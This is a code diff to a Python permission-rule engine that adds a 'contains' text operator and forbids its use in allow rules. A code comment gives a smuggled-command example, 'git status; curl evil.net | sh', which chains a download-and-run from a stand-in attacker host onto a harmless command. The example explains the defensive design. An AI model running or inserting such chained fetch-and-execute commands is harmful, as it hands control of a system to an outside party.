@@ -127,11 +127,14 @@ class Op(StrEnum):
     # The URL's real host is one of these (any scheme/port/case). ".x.com" = x.com
     # and any subdomain of it.
     HOST_IN = "host_in"
+    # The text argument contains this text (or any of a list of texts). Compares text,
+    # not meaning ("rm -fr" doesn't contain "rm -rf"): only for deny / require_approval.
+    CONTAINS = "contains"
 
 
 NUMBER_OPS = {Op.GT, Op.GTE, Op.LT, Op.LTE}
 PRESENCE_OPS = {Op.EXISTS, Op.MISSING}
-TEXT_OPS = {Op.EQ, Op.NEQ, Op.IN, Op.STARTSWITH, Op.ENDSWITH}  # may use ignore_case
+TEXT_OPS = {Op.EQ, Op.NEQ, Op.IN, Op.STARTSWITH, Op.ENDSWITH, Op.CONTAINS}  # may use ignore_case
 
 
 def is_number(value: object) -> TypeGuard[int | float]:
@@ -242,6 +245,15 @@ class Condition(BaseModel):
                     f"'host_in' needs a list of 1 to {MAX_IN_VALUES} lowercase host names, "
                     'e.g. ["api.example.com", ".example.com"]'
                 )
+        if self.op is Op.CONTAINS:
+            needles = self.value if isinstance(self.value, list) else [self.value]
+            ok = (isinstance(self.value, str) or 1 <= len(needles) <= MAX_IN_VALUES) and all(
+                isinstance(v, str) and v.strip() for v in needles
+            )
+            if not ok:
+                raise ValueError(
+                    f"'contains' needs a non-empty text or a list of 1 to {MAX_IN_VALUES} texts"
+                )
         if self.op in {Op.EQ, Op.NEQ} and not is_scalar(self.value):
             raise ValueError(f"'{self.op}' needs a text, number or true/false value")
         texts = self.value if isinstance(self.value, list) else [self.value]
@@ -298,6 +310,17 @@ class Rule(BaseModel):
         if value is None:
             raise ValueError("'otherwise' must be require_approval or deny (or left out)")
         return value
+
+    @model_validator(mode="after")
+    def no_contains_in_allow_rules(self) -> "Rule":
+        # "allow when command contains 'git status'" also allows
+        # "git status; curl evil.net | sh". contains is a tripwire, not an allow list.
+        if self.effect is Decision.ALLOW and any(c.op is Op.CONTAINS for c in self.when):
+            raise ValueError(
+                "'contains' can't be used in an allow rule (it would also allow anything "
+                "around the text); use eq, in or startswith to allow"
+            )
+        return self
 
     @model_validator(mode="after")
     def otherwise_is_stricter(self) -> "Rule":
